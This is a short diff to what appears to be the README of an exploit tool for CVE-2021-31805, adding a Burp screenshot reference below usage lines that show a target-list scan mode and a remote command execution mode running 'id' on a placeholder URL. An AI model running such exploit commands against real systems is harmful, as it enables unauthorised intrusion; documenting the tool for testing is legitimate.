@@ -15,3 +15,5 @@ python3 CVE-2021-31805.py -m scan -f 123.txt
 python3 CVE-2021-31805.py -u https://xxx.xxx.com:8080 -c id
 ```
 ![rce_mode](rce.jpg)
+
+![burp](burp.jpg)
